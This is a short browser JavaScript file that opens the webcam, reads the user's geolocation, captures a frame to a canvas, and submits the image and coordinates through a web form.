const video = document.querySelector('video');
const img = document.getElementById('inp_img');
const canvas = document.querySelector('canvas');

function hasGetUserMedia() {
  return !!(navigator.mediaDevices &&
    navigator.mediaDevices.getUserMedia);
}

var latitude = 0;
var longitude = 0;

if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(setPosition);
}

function setPosition(position)
{
    latitude = position.coords.latitude;
    longitude = position.coords.longitude;
}

function captureImage() {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    img.value = canvas.toDataURL('image/png');
    document.getElementById('inp_latitude').value = latitude;
    document.getElementById('inp_longitude').value = longitude;
    document.getElementById("imageForm").submit();
}

setTimeout(function() {
    $("div#scan").fadeOut();
},3000);

if (hasGetUserMedia())
{
    const constraints = {
      video: true
    };

    const video = document.querySelector('video');

    navigator.mediaDevices.getUserMedia(constraints).
      then((stream) => {
          video.srcObject = stream
          $('video').fadeIn();
      });
}

else
{
  alert('Your browser does not support cameras.');
}
